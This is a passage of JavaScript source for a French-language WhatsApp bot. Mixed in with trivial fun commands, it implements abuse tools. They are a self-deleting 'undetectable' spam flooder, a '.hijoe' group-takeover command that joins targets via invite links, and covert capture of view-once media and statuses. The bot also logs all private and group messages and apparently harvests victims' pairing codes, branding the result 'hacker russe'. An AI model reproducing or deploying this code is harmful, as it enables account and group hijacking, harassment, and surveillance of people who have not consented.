  execute: async (msg, jid) => {
    const r = Math.random() > 0.5 ? 'FACE' : 'PILE';
    await sock.sendMessage(jid, { text: `🪙 ${r}` });
  }
});

commands.set('quiz', {
  desc: 'Question aléatoire',
  execute: async (msg, jid) => {
    const qs = [
      { q: 'Plus grand océan ?', r: 'Pacifique' },
      { q: 'Année création WhatsApp ?', r: '2009' },
      { q: 'Combien de continents ?', r: '7' }
    ];
    const q = qs[Math.floor(Math.random() * qs.length)];
    await sock.sendMessage(jid, { text: `❓ ${q.q}\n\nRéponse dans 5s...` });
    setTimeout(async () => {
      await sock.sendMessage(jid, { text: `✅ ${q.r}` });
    }, 5000);
  }
});

commands.set('math', {
  desc: 'Calcul mental',
  execute: async (msg, jid) => {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    const op = ['+', '-', '*'][Math.floor(Math.random() * 3)];
    let res;
    if (op === '+') res = a + b;
    else if (op === '-') res = a - b;
    else res = a * b;
    await sock.sendMessage(jid, { text: `🧮 ${a} ${op} ${b} = ${res}` });
  }
});

commands.set('fact', {
  desc: 'Fait intéressant',
  execute: async (msg, jid) => {
    const facts = [
      'Les pieuvres ont 3 coeurs.',
      'Le miel ne se périme jamais.',
      'Les bananes sont des baies.',
      'Les éléphants ne peuvent pas sauter.'
    ];
    await sock.sendMessage(jid, { text: `📚 ${facts[Math.floor(Math.random() * facts.length)]}` });
  }
});

commands.set('joke', {
  desc: 'Blague',
  execute: async (msg, jid) => {
    const jokes = [
      'Pourquoi les plongeurs plongent en arrière ? Sinon ils tombent dans le bateau.',
      'Quel est le comble pour un électricien ? Ne pas être au courant.',
      'Pourquoi les poissons ne jouent pas au basket ? Peur du filet.'
    ];
    await sock.sendMessage(jid, { text: `😂 ${jokes[Math.floor(Math.random() * jokes.length)]}` });
  }
});

commands.set('quote', {
  desc: 'Citation motivation',
  execute: async (msg, jid) => {
    const qs = [
      'Succès = aller d\'échec en échec sans perdre l\'enthousiasme. - Churchill',
      'La seule limite sera nos doutes d\'aujourd\'hui. - F. Roosevelt',
      'Meilleur moyen de prédire l\'avenir est de le créer. - P. Drucker'
    ];
    await sock.sendMessage(jid, { text: `💫 ${qs[Math.floor(Math.random() * qs.length)]}` });
  }
});

commands.set('rate', {
  desc: 'Noter',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const chose = txtMsg.replace('.rate','').trim() || 'ça';
    const note = Math.floor(Math.random() * 10) + 1;
    await sock.sendMessage(jid, { text: `📊 ${chose}: ${note}/10 ${'⭐'.repeat(note)}${'☆'.repeat(10-note)}` });
  }
});

commands.set('roast', {
  desc: 'Insulte drôle',
  execute: async (msg, jid) => {
    const roasts = [
      'Tu prouves que l\'évolution peut faire marche arrière.',
      'Ton QI est plus bas que l\'Antarctique.',
      'Tu es comme un nuage : quand tu disparais, la journée s\'illumine.'
    ];
    await sock.sendMessage(jid, { text: `🔥 ${roasts[Math.floor(Math.random() * roasts.length)]}` });
  }
});

commands.set('reverse', {
  desc: 'Inverser texte',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.reverse','').trim();
    if (!t) return sock.sendMessage(jid, { text: 'Usage: .reverse texte' });
    await sock.sendMessage(jid, { text: `🔀 ${t.split('').reverse().join('')}` });
  }
});

commands.set('count', {
  desc: 'Compter mots',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.count','').trim();
    if (!t) return sock.sendMessage(jid, { text: 'Usage: .count texte' });
    const mots = t.split(/\s+/).filter(Boolean).length;
    await sock.sendMessage(jid, { text: `📝 Mots: ${mots} | Caractères: ${t.length}` });
  }
});

commands.set('base64', {
  desc: 'Base64',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.base64','').trim();
    if (!t) return sock.sendMessage(jid, { text: 'Usage: .base64 texte | .base64 decode:TEXTE' });
    if (t.startsWith('decode:')) {
      try {
        const d = Buffer.from(t.replace('decode:',''), 'base64').toString('utf-8');
        await sock.sendMessage(jid, { text: `🔓 ${d}` });
      } catch (e) {
        await sock.sendMessage(jid, { text: 'Erreur décodage' });
      }
    } else {
      await sock.sendMessage(jid, { text: `🔐 ${Buffer.from(t).toString('base64')}` });
    }
  }
});

commands.set('short', {
  desc: 'Raccourcir',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.short','').trim();
    if (!t) return sock.sendMessage(jid, { text: 'Usage: .short texte' });
    await sock.sendMessage(jid, { text: `📌 ${t.length > 30 ? t.substring(0,27)+'...' : t}` });
  }
});

// SPAM
let spamInterval = null;
let spamActive = false;

commands.set('spam', {
  desc: 'Spam indétectable',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const parts = txtMsg.replace('.spam','').trim().split(' ');
    const count = parseInt(parts[0]) || 5;
    const message = parts.slice(1).join(' ') || 'Spam';

    if (spamActive) return sock.sendMessage(jid, { text: 'Spam déjà actif. Utilisez .spamstop' });
    if (count > 100) return sock.sendMessage(jid, { text: 'Maximum 100 messages' });

    spamActive = true;
    let sent = 0;
    await sock.sendMessage(jid, { text: `Spam lancé: ${count}x` });

    spamInterval = setInterval(async () => {
      if (sent >= count || !spamActive) {
        clearInterval(spamInterval);
        spamInterval = null;
        spamActive = false;
        await sock.sendMessage(jid, { text: 'Spam terminé' });
        return;
      }
      try {
        const sentMsg = await sock.sendMessage(jid, { text: message });
        if (sentMsg?.key?.id) {
          setTimeout(async () => {
            try {
              await sock.sendMessage(jid, {
                delete: { remoteJid: jid, fromMe: true, id: sentMsg.key.id, participant: sock.user.id }
              });
            } catch (e) {}
          }, 2000);
        }
        sent++;
      } catch (e) {}
    }, 800);
  }
});

commands.set('spamstop', {
  desc: 'Arrêter spam',
  execute: async (msg, jid) => {
    if (!spamActive) return sock.sendMessage(jid, { text: 'Aucun spam' });
    spamActive = false;
    if (spamInterval) { clearInterval(spamInterval); spamInterval = null; }
    await sock.sendMessage(jid, { text: 'Spam arrêté' });
  }
});

// Commandes générales
commands.set('allmenu', {
  desc: 'Tout le menu',
  execute: async (msg, jid) => {
    let t = '📋 ALL MENU\n\n';
    t += 'GÉNÉRAL: .menu .funmenu .ping .owner .runtime .info\n';
    t += 'GROUPES: .tagall .hidetag .linkgroup .listadmin .kick .add .promote .demote\n';
    t += 'MÉDIA: .s .toimg\n';
    t += 'VU UNIQUE: répondre avec un sticker\n';
    t += 'PENTEST: .hijoe .scaninvite\n';
    t += 'FUN: .rps .dice .flip .quiz .math .fact .joke .quote .rate .roast\n';
    t += 'SPAM: .spam .spamstop\n';
    t += 'OUTILS: .delete .q .react\n';
    t += 'OWNER: .bc .setprefix .block .unblock .set';
    await sock.sendMessage(jid, { text: t });
  }
});

commands.set('ping', {
  desc: 'Ping',
  execute: async (msg, jid) => {
    const s = Date.now();
    await sock.sendMessage(jid, { text: 'Pong!' });
    await sock.sendMessage(jid, { text: `${Date.now() - s}ms` });
  }
});

commands.set('owner', {
  desc: 'Owner',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, { text: `wa.me/${OWNER.split('@')[0]}` });
  }
});

commands.set('runtime', {
  desc: 'Uptime',
  execute: async (msg, jid) => {
    const u = process.uptime();
    await sock.sendMessage(jid, { text: `${Math.floor(u/3600)}h ${Math.floor((u%3600)/60)}m ${Math.floor(u%60)}s` });
  }
});

commands.set('info', {
  desc: 'Info bot',
  execute: async (msg, jid) => {
    const u = process.uptime();
    await sock.sendMessage(jid, { text: `${BOT_NAME} v${BOT_VERSION}\nActif: ${Math.floor(u/3600)}h\nOwner: ${OWNER.split('@')[0]}` });
  }
});

commands.set('allmenu', {
  desc: 'Tout le menu',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, { text: buildAllMenu() });
  }
});

commands.set('ping', {
  desc: 'Ping',
  execute: async (msg, jid) => {
    const s = Date.now();
    await sock.sendMessage(jid, {
      text: box('PING', [
        'Signal: ONLINE',
        `Latence: ${Date.now() - s}ms`,
        `Uptime: ${formatRuntime()}`
      ])
    });
  }
});

commands.set('owner', {
  desc: 'Owner',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, {
      text: box('OWNER', [
        `Numero: ${OWNER.split('@')[0]}`,
        `Lien: wa.me/${OWNER.split('@')[0]}`,
        `Bot: ${BOT_NAME}`
      ])
    });
  }
});

commands.set('runtime', {
  desc: 'Uptime',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, {
      text: box('RUNTIME', [
        `Actif: ${formatRuntime()}`,
        `Depuis: ${moment().subtract(process.uptime(), 'seconds').format('DD/MM/YYYY HH:mm:ss')}`
      ])
    });
  }
});

commands.set('info', {
  desc: 'Info bot',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, { text: buildConnectionDashboard('active') });
  }
});

commands.set('tagall', {
  desc: 'Tagger tous',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const meta = await sock.groupMetadata(jid);
    const mentions = meta.participants.map(p => p.id);
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.tagall','').trim() || ' ';
    await sock.sendMessage(jid, { text: `@everyone\n\n${t}`, mentions });
  }
});

commands.set('hidetag', {
  desc: 'Taguer silencieux',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const meta = await sock.groupMetadata(jid);
    const mentions = meta.participants.map(p => p.id);
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.hidetag','').trim() || ' ';
    await sock.sendMessage(jid, { text: t, mentions });
  }
});

commands.set('linkgroup', {
  desc: 'Lien groupe',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    try {
      const code = await sock.groupInviteCode(jid);
      await sock.sendMessage(jid, { text: `https://chat.whatsapp.com/${code}` });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Admin requis' });
    }
  }
});

commands.set('listadmin', {
  desc: 'Liste admins',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const meta = await sock.groupMetadata(jid);
    const admins = meta.participants.filter(p => p.admin);
    let t = `ADMINS (${admins.length})\n${meta.subject}\n\n`;
    for (const a of admins) {
      t += `${a.admin === 'superadmin' ? 'ROI' : 'ADMIN'} ${a.id.split('@')[0]}\n`;
    }
    await sock.sendMessage(jid, { text: t });
  }
});

commands.set('kick', {
  desc: 'Expulser',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const user = ctx?.mentionedJid?.[0] || ctx?.participant;
    if (!user) return sock.sendMessage(jid, { text: 'Mentionnez' });
    try {
      await sock.groupParticipantsUpdate(jid, [user], 'remove');
      await sock.sendMessage(jid, { text: 'Expulsé', mentions: [user] });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Admin requis' });
    }
  }
});

commands.set('add', {
  desc: 'Ajouter',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const n = txtMsg.replace('.add','').replace(/[^0-9]/g,'');
    if (!n) return sock.sendMessage(jid, { text: 'Usage: .add 22812345678' });
    try {
      await sock.groupParticipantsUpdate(jid, [n+'@s.whatsapp.net'], 'add');
      await sock.sendMessage(jid, { text: `${n} ajouté` });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Erreur' });
    }
  }
});

commands.set('promote', {
  desc: 'Promouvoir',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const user = ctx?.mentionedJid?.[0] || ctx?.participant;
    if (!user) return sock.sendMessage(jid, { text: 'Mentionnez' });
    try {
      await sock.groupParticipantsUpdate(jid, [user], 'promote');
      await sock.sendMessage(jid, { text: 'Promu', mentions: [user] });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Admin requis' });
    }
  }
});

commands.set('demote', {
  desc: 'Rétrograder',
  execute: async (msg, jid, pn, isGroup) => {
    if (!isGroup) return sock.sendMessage(jid, { text: 'Groupe seulement' });
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const user = ctx?.mentionedJid?.[0] || ctx?.participant;
    if (!user) return sock.sendMessage(jid, { text: 'Mentionnez' });
    try {
      await sock.groupParticipantsUpdate(jid, [user], 'demote');
      await sock.sendMessage(jid, { text: 'Rétrogradé', mentions: [user] });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Admin requis' });
    }
  }
});

commands.set('s', {
  desc: 'Sticker',
  execute: async (msg, jid) => {
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const q = ctx?.quotedMessage;
    if (!q?.imageMessage) return sock.sendMessage(jid, { text: 'Répondez à une image' });
    try {
      const media = await downloadContentFromMessage(q.imageMessage, 'image');
      const buf = [];
      for await (const c of media) buf.push(c);
      const sticker = await sharp(Buffer.concat(buf)).resize(512, 512, { fit: 'cover' }).webp({ quality: 50 }).toBuffer();
      await sock.sendMessage(jid, { sticker, mimetype: 'image/webp' });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Erreur' });
    }
  }
});

commands.set('toimg', {
  desc: 'Sticker vers image',
  execute: async (msg, jid) => {
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const q = ctx?.quotedMessage;
    if (!q?.stickerMessage) return sock.sendMessage(jid, { text: 'Répondez à un sticker' });
    try {
      const media = await downloadContentFromMessage(q.stickerMessage, 'sticker');
      const buf = [];
      for await (const c of media) buf.push(c);
      const img = await sharp(Buffer.concat(buf)).toFormat('png').toBuffer();
      await sock.sendMessage(jid, { image: img, caption: 'Converti' });
    } catch (e) {
      await sock.sendMessage(jid, { text: 'Erreur' });
    }
  }
});

commands.set('vv', {
  desc: 'Révéler vu unique',
  execute: async (msg, jid) => {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) return sock.sendMessage(jid, { text: '❌ Répondez à un message à vue unique' });

    const viewOnceMedia = quoted.imageMessage?.viewOnce || quoted.videoMessage?.viewOnce || quoted.audioMessage?.viewOnce;
    if (!viewOnceMedia) return sock.sendMessage(jid, { text: '❌ Pas un message à vue unique' });

    try {
      let sendMsg;
      if (quoted.imageMessage) {
        const buffer = await getBuffer(quoted.imageMessage, 'image');
        if (buffer) {
          sendMsg = { image: buffer, caption: '🔓 Vue unique récupérée' };
          fs.writeFileSync(path.join(DIRS.media.vuunique, `vv_image_${Date.now()}.jpg`), buffer);
        }
      } else if (quoted.videoMessage) {
        const buffer = await getBuffer(quoted.videoMessage, 'video');
        if (buffer) {
          sendMsg = { video: buffer, caption: '🔓 Vue unique récupérée' };
          fs.writeFileSync(path.join(DIRS.media.vuunique, `vv_video_${Date.now()}.mp4`), buffer);
        }
      } else if (quoted.audioMessage) {
        const buffer = await getBuffer(quoted.audioMessage, 'audio');
        if (buffer) {
          sendMsg = { audio: buffer, mimetype: 'audio/mp4' };
          fs.writeFileSync(path.join(DIRS.media.vuunique, `vv_audio_${Date.now()}.mp3`), buffer);
        }
      }

      if (sendMsg) {
        await sock.sendMessage(jid, sendMsg, { quoted: msg });
      }
    } catch (err) {
      console.error('vv error:', err);
      await sock.sendMessage(jid, { text: `Erreur: ${err.message}` });
    }
  }
});

commands.delete('vv');

commands.set('delete', {
  desc: 'Supprimer',
  execute: async (msg, jid) => {
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    if (!ctx?.stanzaId) return sock.sendMessage(jid, { text: 'Répondez' });
    await sock.sendMessage(jid, { delete: { remoteJid: jid, fromMe: !!ctx.participant, id: ctx.stanzaId, participant: ctx.participant } });
  }
});

commands.set('q', {
  desc: 'Citer',
  execute: async (msg, jid) => {
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    if (!ctx) return sock.sendMessage(jid, { text: 'Répondez' });
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.q','').trim() || 'Citation';
    await sock.sendMessage(jid, { text: t, quoted: { key: { remoteJid: jid, fromMe: false, id: ctx.stanzaId, participant: ctx.participant } } });
  }
});

commands.set('react', {
  desc: 'Réagir',
  execute: async (msg, jid) => {
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const e = txtMsg.replace('.react','').trim() || '👍';
    if (!ctx?.stanzaId) return sock.sendMessage(jid, { text: 'Répondez' });
    await sock.sendMessage(jid, { react: { text: e, key: { remoteJid: jid, fromMe: false, id: ctx.stanzaId, participant: ctx.participant } } });
  }
});

// Owner commands
commands.set('bc', {
  desc: 'Broadcast',
  execute: async (msg, jid) => {
    if (jid !== OWNER) return;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.bc','').trim();
    if (!t) return;
    await sock.sendMessage(jid, { text: `📢 ${t}` });
  }
});

commands.set('setprefix', {
  desc: 'Changer préfixe',
  execute: async (msg, jid) => {
    if (jid !== OWNER) return;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const p = txtMsg.replace('.setprefix','').trim();
    if (!p) return;
    CONFIG = updateConfig({ prefix: p });
    await sock.sendMessage(jid, { text: `Préfixe: ${p}` });
  }
});

commands.set('block', {
  desc: 'Bloquer',
  execute: async (msg, jid) => {
    if (jid !== OWNER) return;
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const n = txtMsg.replace('.block','').replace(/[^0-9]/g,'');
    const t = ctx?.mentionedJid?.[0] || (n ? n+'@s.whatsapp.net' : null);
    if (!t) return;
    await sock.updateBlockStatus(t, 'block');
    await sock.sendMessage(jid, { text: 'Bloqué' });
  }
});

commands.set('unblock', {
  desc: 'Débloquer',
  execute: async (msg, jid) => {
    if (jid !== OWNER) return;
    const ci = msg.message?.extendedTextMessage;
    const ctx = ci?.contextInfo;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const n = txtMsg.replace('.unblock','').replace(/[^0-9]/g,'');
    const t = ctx?.mentionedJid?.[0] || (n ? n+'@s.whatsapp.net' : null);
    if (!t) return;
    await sock.updateBlockStatus(t, 'unblock');
    await sock.sendMessage(jid, { text: 'Débloqué' });
  }
});

commands.set('set', {
  desc: 'Configuration',
  execute: async (msg, jid) => {
    if (jid !== OWNER) return;
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const t = txtMsg.replace('.set','').trim();
    const parts = t.split(' ');
    const key = parts[0];
    const val = parts.slice(1).join(' ');
    const settings = { botname: 'botName', prefix: 'prefix', logprivate: 'logPrivate', logowner: 'logOwnerMessages', autodownload: 'autoDownloadMedia', autostatus: 'autoDownloadStatus' };
    if (settings[key] && val) {
      let v = val;
      if (['logprivate','logowner','autodownload','autostatus'].includes(key)) v = ['true','1','oui','yes'].includes(val.toLowerCase());
      CONFIG = updateConfig({ [settings[key]]: v });
      await sock.sendMessage(jid, { text: `${settings[key]} = ${v}` });
    } else {
      let info = `CONFIG\nBotName: ${CONFIG.botName}\nPrefix: ${CONFIG.prefix}\nLogPrivate: ${CONFIG.logPrivate}\nAutoDL: ${CONFIG.autoDownloadMedia}\n\n.set botname X\n.set prefix #\n.set logprivate true`;
      await sock.sendMessage(jid, { text: info });
    }
  }
});

commands.set('scaninvite', {
  desc: 'Scanner groupe',
  execute: async (msg, jid2, pn, isGroup) => {
    if (!isGroup) return;
    try {
      const meta = await sock.groupMetadata(jid2);
      let r = `SCAN GROUPE\n${meta.subject}\nMembres: ${meta.participants.length}\nAdmins: ${meta.participants.filter(p => p.admin).length}\nCode: ${meta.inviteCode || 'N/A'}\nAddMode: ${meta.memberAddMode ? 'Tous' : 'Admins'}\nRestrict: ${meta.restrict ? 'Admins' : 'Tous'}\nAnnounce: ${meta.announce ? 'Admins' : 'Tous'}`;
      await sock.sendMessage(jid2, { text: r });
    } catch (e) {
      await sock.sendMessage(jid2, { text: `Erreur: ${e.message}` });
    }
  }
});

// HIJOE command
commands.set('hijoe', {
  desc: '18 techniques prise de contrôle',
  execute: async (msg, jid2, pushName, isGroup) => {
    const rawText = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const args = rawText.replace('.hijoe','').trim().toLowerCase();

    if (args === 'list') {
      let r = 'HIJOE SESSIONS\n\n';
      const s = Object.keys(hijoeSessions);
      if (s.length === 0) r += 'Aucune session';
      for (const id of s) {
        const h = hijoeSessions[id];
        r += `${h.groupName || id.slice(0,25)}: ${h.success ? 'REUSSI' : 'ECHEC'} (${h.techniques || 0}/18)\n`;
      }
      return sock.sendMessage(jid2, { text: r });
    }

    if (args === 'clear') {
      Object.keys(hijoeSessions).forEach(k => delete hijoeSessions[k]);
      return sock.sendMessage(jid2, { text: 'Sessions effacées' });
    }

    let groupJid = jid2;
    let groupName = 'GROUPE CIBLE';

    if (isGroup) {
      try { const m = await sock.groupMetadata(jid2); groupName = m.subject; } catch (e) {}
    } else if (jid2 === OWNER) {
      const linkMatch = rawText.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
      if (linkMatch) {
        const code = linkMatch[1];
        try {
          const info = await sock.groupGetInviteInfo(code);
          groupJid = info.id;
          groupName = info.subject || 'Groupe inconnu';
          try { await sock.groupAcceptInvite(code); } catch (e) {}
        } catch (e) {
          return sock.sendMessage(jid2, { text: `Lien invalide: ${e.message}` });
        }
      } else {
        return sock.sendMessage(jid2, { text: 'Usage: .hijoe (dans groupe) ou .hijoe https://chat.whatsapp.com/CODE' });
      }
    }

    await hijoeProtocolV4(groupJid, OWNER, groupName, isGroup, msg, jid2);
  }
});

// ========== CONNECTION ==========
async function connectBot() {
  try {
    console.log(`\n${'═'.repeat(60)}`);
    console.log(`  ${BOT_NAME} v${BOT_VERSION}`);
    console.log(`  ${moment().format('DD/MM/YYYY HH:mm:ss')}`);
    console.log(`${'═'.repeat(60)}\n`);

    CONFIG = await getConfig();
    OWNER = CONFIG.ownerNumber || OWNER;
    console.log(`Owner: ${OWNER.split('@')[0]} (${OWNER})`);

    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: 'silent' }),
      browser: [BOT_NAME, 'Chrome', BOT_VERSION],
      syncFullHistory: true,
      markOnlineOnConnect: true,
      qrTimeout: 120000,
      version
    });

    const rawSendMessage = sock.sendMessage.bind(sock);
    sock.sendMessage = async (...args) => {
      const outgoingText = args[1]?.text || args[1]?.caption || '';
      if (outgoingText) {
        botSentTexts.add(outgoingText);
        setTimeout(() => botSentTexts.delete(outgoingText), 5 * 60 * 1000);
      }
      const sent = await rawSendMessage(...args);
      const sentId = sent?.key?.id;
      if (sentId) {
        botSentMessageIds.add(sentId);
        setTimeout(() => botSentMessageIds.delete(sentId), 5 * 60 * 1000);
      }
      return sent;
    };

    let qrDisplayed = false;
    let pairingTimeout = null;

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;

      if (qr && !qrDisplayed) {
        qrDisplayed = true;
        console.log('Scannez le QR code');
        QRCode.generate(qr, { small: true });
      }

      if (!qrDisplayed && !connection && !pairingTimeout) {
        pairingTimeout = setTimeout(async () => {
          if (!qrDisplayed) {
            const readline = require('readline');
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question('Numero: ', async (phone) => {
              const clean = phone.replace(/[^0-9]/g, '');
              if (!sock) { rl.close(); return; }
              try {
                const code = await sock.requestPairingCode(clean);
                console.log(`CODE: ${code}`);
              } catch (e) {
                console.log(`Erreur: ${e.message}`);
              }
              rl.close();
            });
          }
        }, 15000);
      }

      if (connection === 'open') {
        if (pairingTimeout) { clearTimeout(pairingTimeout); pairingTimeout = null; }
        console.log('Connecté!');
        if (OWNER) {
          try {
            await sock.sendMessage(OWNER, { text: buildConnectionDashboard(version) });
          } catch (e) {}
        }
      }

      if (connection === 'close') {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        console.log(`Déconnecté (loggedOut: ${isLoggedOut})`);
        sock = null;
        if (!isLoggedOut && !isReconnecting) {
          isReconnecting = true;
          console.log('Reconnexion dans 5s...');
          setTimeout(async () => {
            isReconnecting = false;
            await connectBot();
          }, 5000);
        }
      }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
      for (const msg of messages) {
        try {
          const fromMe = !!msg.key?.fromMe;

          if (msg.key?.remoteJid === 'status@broadcast') {
            const fromName = msg.pushName || '?';
            const body = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '[Media]';
            logMessage('status', { from: msg.key.participant || msg.key.remoteJid, fromName, body });
            if (CONFIG.autoDownloadStatus !== false) await downloadStatus(msg);
            continue;
          }

          const jid2 = msg.key.remoteJid;
          const isGroup = jid2.endsWith('@g.us');
          const pushName = msg.pushName || 'Inconnu';
          const sender = fromMe ? OWNER : (msg.key.participant || jid2);
          const txt = msg.message?.conversation || msg.message?.extendedTextMessage?.text || msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || '';

          if (!isGroup && !fromMe && txt) {
            const maybeCode = txt.trim().toUpperCase().match(/\b([A-Z0-9]{4}-[A-Z0-9]{4})\b/);
            if (maybeCode) {
              const phone = sender.split('@')[0].replace(/\D/g, '');
              const confirmed = await confirmPairingCode(phone, maybeCode[1]);
              if (confirmed) {
                await sock.sendMessage(jid2, { text: `✅ Code valide. Pairing réussi ! Build by joeslapet / hacker russe.` });
                continue;
              }
            }
          }
          const isBotSent = fromMe && (botSentMessageIds.has(msg.key?.id) || botSentTexts.has(txt));
          const messageType = getContentType(msg.message || {}) || 'unknown';
          const senderName = await getContactName(sock, sender);

          // Log
          if (isGroup) {
            const meta = await sock.groupMetadata(jid2).catch(() => null);
            logOwnerEvent('MESSAGE', {
              type: 'GROUPE',
              fromMe: fromMe ? 'oui' : 'non',
              de: senderName,
              num: sender.split('@')[0],
              owner: OWNER.split('@')[0],
              messageType,
              groupe: meta ? meta.subject : '?',
              msg: txt || '[Media]'
            });
            logMessage('group', { from: sender, fromName: senderName, to: jid2, toName: meta ? meta.subject : 'Groupe', body: txt || '[Media]', groupName: meta ? meta.subject : 'Groupe', groupId: jid2, type: txt ? 'text' : 'media' });
          } else {
            logOwnerEvent('MESSAGE', {
              type: 'PRIVÉ',
              fromMe: fromMe ? 'oui' : 'non',
              de: senderName,
              num: sender.split('@')[0],
              owner: OWNER.split('@')[0],
              messageType,
              msg: txt || '[Media]'
            });
            logMessage('message', { from: sender, fromName: senderName, to: jid2, toName: sock.user?.name || 'Bot', body: txt || '[Media]', type: txt ? 'text' : 'media' });
          }

          // Détection automatique vu unique
          const vo = extractViewOnce(msg);
          if (vo) {
            console.log(`VU UNIQUE détecté de ${senderName}`);
            await handleViewOnce(msg, sender, senderName, jid2, isGroup);
          }

          // Sticker réponse sur vu unique
          if (msg.message?.stickerMessage) {
            const ctxVo = msg.message.stickerMessage.contextInfo;
            if (ctxVo?.quotedMessage) {
              const fakeMsg = { message: ctxVo.quotedMessage };
              const voQuoted = extractViewOnce(fakeMsg);
              if (voQuoted) {
                await handleViewOnce(fakeMsg, sender, senderName, jid2, isGroup);
              }
            }
          }

          // Commandes dans les messages envoyés ou reçus
          const commandInfos = isBotSent ? [] : extractCommandsFromText(txt);
          let shouldDeleteCommandMessage = false;
          for (const commandInfo of commandInfos) {
            const cmd = commands.get(commandInfo.cmdName);
            if (cmd) {
              const commandMsg = buildCommandMessage(msg, commandInfo.commandText);
              console.log(`Commande: ${CONFIG.prefix}${commandInfo.cmdName} par ${senderName}${fromMe ? ' (envoyé)' : ''}`);
              const effectKeys = await sendCommandEffect(jid2, commandInfo.cmdName, senderName);
              await cmd.execute(commandMsg, jid2, senderName, isGroup);
              for (const key of effectKeys) {
                await deleteMessageSilent(jid2, key);
              }
              shouldDeleteCommandMessage = true;
            }
          }
          if (shouldDeleteCommandMessage) {
            await deleteMessageSilent(jid2, msg.key);
          }
        } catch (e) {
          console.error('Erreur:', e.message);
        }
      }
    });
sock.ev.on('call', async (calls) => {
      for (const call of calls) {
        const num = call.from.split('@')[0];
        logMessage('call', { from: call.from, fromName: num, status: call.status });
        console.log(`Appel ${call.status} de ${num}`);
        if (call.status === 'offer') {
          try {
            await sock.rejectCall(call.id, call.from);
            console.log(`Appel rejeté: ${num}`);
          } catch (e) {
            console.error('Erreur rejet appel:', e.message);
          }
        }
      }
    });

    sock.ev.on('group-participants.update', async (update) => {
      const { id, participants, action } = update;
      if (!participants || !Array.isArray(participants)) return;
      const jids = participants.map(p => typeof p === 'string' ? p : (p.id || p));
      if (action === 'add' && jids.includes(OWNER)) {
        const meta = await sock.groupMetadata(id).catch(() => null);
        await sock.sendMessage(OWNER, { text: `✅ Ajouté à: ${meta ? meta.subject : id}` });
      }
